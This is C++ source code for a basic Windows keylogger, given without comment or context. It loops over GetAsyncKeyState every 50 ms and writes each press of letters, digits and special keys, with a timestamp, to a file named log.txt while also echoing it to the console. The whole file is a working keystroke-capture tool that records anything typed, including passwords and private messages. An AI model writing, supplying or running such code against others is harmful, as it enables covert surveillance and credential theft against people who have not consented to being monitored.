#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <iomanip>
#include <ctime>
#include <sstream>

std::ofstream outfile{"log.txt", std::ios::app};

std::string currentTime() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_t = std::chrono::system_clock::to_time_t(now);
    std::tm localTime = *std::localtime(&now_t);

    std::ostringstream timeStream;
    timeStream << std::put_time(&localTime, "[%Y-%m-%d %H:%M:%S] ");
    return timeStream.str();
}

void logg(std::string s) {
    if (outfile.is_open()) {
        outfile << currentTime() << s << std::endl;
        std::cout << currentTime() << s << std::endl;
    }
}

int main() {
    while (true) {
        // Special keys
        if (GetAsyncKeyState(VK_RETURN) & 0x8000) logg("{ENTER}");
        if (GetAsyncKeyState(VK_BACK) & 0x8000) logg("{BACKSPACE}");
        if (GetAsyncKeyState(VK_SPACE) & 0x8000) logg("{SPACE}");
        if (GetAsyncKeyState(VK_TAB) & 0x8000) logg("{TAB}");
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) logg("{ESC}");
        if (GetAsyncKeyState(VK_DELETE) & 0x8000) logg("{DELETE}");
        
        // Modifier keys
        if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) logg("{LSHIFT}");
        if (GetAsyncKeyState(VK_RSHIFT) & 0x8000) logg("{RSHIFT}");
        if (GetAsyncKeyState(VK_LCONTROL) & 0x8000) logg("{LCTRL}");
        if (GetAsyncKeyState(VK_RCONTROL) & 0x8000) logg("{RCTRL}");
        if (GetAsyncKeyState(VK_LMENU) & 0x8000) logg("{LALT}");
        if (GetAsyncKeyState(VK_RMENU) & 0x8000) logg("{RALT}");
        if (GetAsyncKeyState(VK_LWIN) & 0x8000) logg("{LWIN}");
        if (GetAsyncKeyState(VK_RWIN) & 0x8000) logg("{RWIN}");
        
        // Function keys
        for (int i = VK_F1; i <= VK_F12; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                logg("{F" + std::to_string(i - VK_F1 + 1) + "}");
            }
        }
        
        // Arrow keys
        if (GetAsyncKeyState(VK_UP) & 0x8000) logg("{UP}");
        if (GetAsyncKeyState(VK_DOWN) & 0x8000) logg("{DOWN}");
        if (GetAsyncKeyState(VK_LEFT) & 0x8000) logg("{LEFT}");
        if (GetAsyncKeyState(VK_RIGHT) & 0x8000) logg("{RIGHT}");
        
        // Navigation keys
        if (GetAsyncKeyState(VK_HOME) & 0x8000) logg("{HOME}");
        if (GetAsyncKeyState(VK_END) & 0x8000) logg("{END}");
        if (GetAsyncKeyState(VK_PRIOR) & 0x8000) logg("{PGUP}");
        if (GetAsyncKeyState(VK_NEXT) & 0x8000) logg("{PGDN}");
        if (GetAsyncKeyState(VK_INSERT) & 0x8000) logg("{INSERT}");
        
        // Lock keys
        if (GetAsyncKeyState(VK_CAPITAL) & 0x8000) logg("{CAPS_LOCK}");
        if (GetAsyncKeyState(VK_NUMLOCK) & 0x8000) logg("{NUM_LOCK}");
        if (GetAsyncKeyState(VK_SCROLL) & 0x8000) logg("{SCROLL_LOCK}");
        
        // Regular keys (A-Z, 0-9)
        for (int ch = 'A'; ch <= 'Z'; ch++) {
            if (GetAsyncKeyState(ch) & 0x8000) {
                logg(std::string(1, ch));
            }
        }
        for (int ch = '0'; ch <= '9'; ch++) {
            if (GetAsyncKeyState(ch) & 0x8000) {
                logg(std::string(1, ch));
            }
        }
        
        Sleep(50);
    }
    return 0;
}